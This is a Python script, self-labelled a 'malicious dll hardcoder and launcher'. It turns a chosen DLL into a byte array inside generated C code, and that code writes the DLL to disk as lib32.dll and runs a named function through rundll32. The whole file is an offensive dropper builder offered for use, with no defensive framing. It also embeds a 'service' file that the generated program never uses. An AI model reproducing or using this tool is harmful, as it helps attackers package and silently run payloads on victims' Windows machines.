import sys
import binascii
import re
import optparse

cowsay = """

 _______________________2018
< malicious dll hardcoder and launcher >
 -----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

"""

print(cowsay)

parser = optparse.OptionParser(usage="%prog --library=mydll.dll --function=FuncToExecute --output=dll.c")

parser.add_option("--svc", "-s" , dest="svc" , help="the service file to hardcode and execute in C program")
parser.add_option("--library", "-l" , dest="lib" , help="the DLL file to hardcode and execute in C program")
parser.add_option("--function" , "-f" , dest="func", help="the function name to call from the DLL ")
parser.add_option("--output","-o",dest="out", help="the output file in C format (Ex:out.c)")

opt , args = parser.parse_args()

if opt.svc :
	svc = (opt.svc)
if not opt.svc:
	print("--svc option is required ..")

if opt.lib :
	dll = (opt.lib)
if not opt.lib:
	print("--library option is required ..")

if opt.func :
	func = (opt.func)
if not opt.func:
	print("--function option is required .. ")

if opt.out :
	out = (opt.out)
if not opt.out :
	print("--output option is required ..")


listesvc = []
liste = []

s1 = open(svc,'rb')
d1 = binascii.hexlify(s1.read())
every_byte1 = re.findall("..",d1)

for n in (every_byte1):
	listesvc.append("0x"+(n))

s = open(dll,'rb')
d = binascii.hexlify(s.read())
every_byte = re.findall("..",d)

for n in (every_byte):
	liste.append("0x"+(n))



template = """
#include<stdio.h>

int main()
{
   unsigned char binsvc[] = { """+(' ,'.join(listesvc))+""" } ; \n
   unsigned char bin[] = { """+(' ,'.join(liste))+""" } ; \n
   FILE *picFile = fopen("lib32.dll","wb");
   fwrite(bin, sizeof(bin), 1, picFile);
   fclose(picFile);
   system("rundll32.exe lib32.dll  """+(func)+""" "); 
}

"""

d = open(out,'wb')
d.write(template)
s.close()
d.close()
print("[+] finished .. ")
